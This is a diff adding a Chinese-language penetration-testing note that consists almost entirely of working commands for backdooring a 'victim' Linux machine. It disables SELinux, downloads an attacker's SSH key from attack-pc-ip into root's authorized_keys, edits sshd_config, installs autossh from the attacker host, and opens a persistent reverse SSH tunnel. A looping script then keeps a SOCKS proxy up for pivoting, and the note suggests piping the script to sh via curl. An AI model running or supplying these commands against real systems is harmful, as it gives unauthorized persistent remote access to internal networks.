@@ -1,0 +1,41 @@
+在做特殊内网渗透的时候用到，就完善记录下
+
+-----------在攻击机执行内容------------------
+useradd test
+passwd test
+su test
+ssh-keygen -t rsa
+chmod 700 ~/.ssh/
+cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+nohup python -m SimpleHTTPServer 8080 > /dev/null 2>&1 &
+exit
+usermod -s /usr/sbin/nologin test
+
+
+-----------在受害机执行内容------------------可以“curl -fsSL 这个脚本|sh”来执行 autossh用作断开自动回连,我的ssh是80端口
+setenforce 0 2>/dev/null
+ulimit -n 50000
+ulimit -u 50000
+wget http://attack-pc-ip:8000/id_rsa -O /root/.ssh/id_rsa
+curl http://attack-pc-ip:8000/id_rsa.pub >> /root/.ssh/authorized_keys
+chmod 700 /root/.ssh/
+chmod 600 /root/.ssh/authorized_keys
+sed -i 's/#RSAAuthentication/RSAAuthentication/' /etc/ssh/sshd_config
+sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/' /etc/ssh/sshd_config
+sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile/' /etc/ssh/sshd_config
+service sshd restart
+yum install -y autossh
+rpm -ivh http://attack-pc-ip:8000/autossh-1.4c-2.el6.x86_64.rpm
+autossh -p 80 -M 6777 -NR 6866:localhost:22 test@attack-pc-ip  -o "ServerAliveInterval 15" -o "ServerAliveCountMax 10" -o "StrictHostKeyChecking=false" -i /root/.ssh/id_rsa
+
+
+--------回连后创建socks-----------------nohup creat-socks.sh >/dev/null 2>&1 &
+#!/bin/sh
+while true;do
+	count=`netstat -ntpl |  grep  12345 | grep -v grep | wc -l`
+	if [ $count == "0" ];then
+		ssh -p 6866 root@127.0.0.1  -qTfnN -D 0.0.0.0:12345 -o "ServerAliveInterval 15" -o "ServerAliveCountMax 10" -o "StrictHostKeyChecking=false" -i /root/id_rsa 'while true; do echo 1;sleep 1;done'
+	fi
+sleep 5
+done
